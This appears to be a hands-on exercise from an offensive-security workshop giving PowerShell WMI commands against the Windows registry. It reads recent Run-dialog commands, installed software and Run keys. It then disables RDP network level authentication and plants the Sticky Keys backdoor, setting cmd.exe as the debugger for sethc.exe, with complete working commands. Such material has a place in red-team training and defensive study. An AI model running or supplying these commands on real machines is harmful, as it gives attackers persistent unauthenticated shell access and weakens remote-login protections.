## Hands On 4 - Interacting with the registry

#### Read registry, get recently used commands:
```
$command_keys = (Invoke-Wmimethod -Namespace root\default -Class StdRegProv -Name GetStringValue @(2147483649, "Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU","MRUList")).sValue

$command_keys -split '' | foreach-object {
  $object = Invoke-Wmimethod -Namespace root\default -Class StdRegProv -Name GetStringValue @(2147483649, "Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",$_)
  if ($object.ReturnValue -eq 0){
    Write-Output $object.sValue
  }
}
```

#### Read registry, get install applications/scripts
```
$uninstall_keys = Invoke-Wmimethod -Namespace root\default -Class StdRegProv -Name EnumKey @(2147483650, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\UNINSTALL")

foreach ($key in $uninstall_keys.sNames){
  $reg_key = "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\UNINSTALL\" + $key
  $object = Invoke-Wmimethod -Namespace root\default -Class StdRegProv -Name GetStringValue @(2147483650, $reg_key,"DisplayName")
  Write-Output $object.sValue
}
```

#### Read registry, enumerate Run keys
````
$sub_keys = Invoke-Wmimethod -Namespace root\default -Class StdRegProv -Name EnumValues @(2147483649, "Software\Microsoft\Windows\CurrentVersion\Run")
foreach ($key in $sub_keys.sNames){
  $object = Invoke-Wmimethod -Namespace root\default -Class StdRegProv -Name GetStringValue @(2147483649, "Software\Microsoft\Windows\CurrentVersion\Run",$key)
  Write-Output $object.sValue
}	
````

#### Edit windows registry to turn off network level authentication and attach debugger to sethc.exe (Stickey Key Backdoor)
From an admin prompt, 
````
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'"

Invoke-Wmimethod -Namespace root\default -Class StdRegProv -Name CreateKey @(2147483650, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe")

Invoke-Wmimethod -Namespace root\default -Class StdRegProv -Name SetStringValue @(2147483650, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", "c:\windows\system32\cmd.exe", "Debugger")

Invoke-Wmimethod -Namespace root\default -Class StdRegProv -Name GetStringValue @(2147483650, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe","Debugger")
````
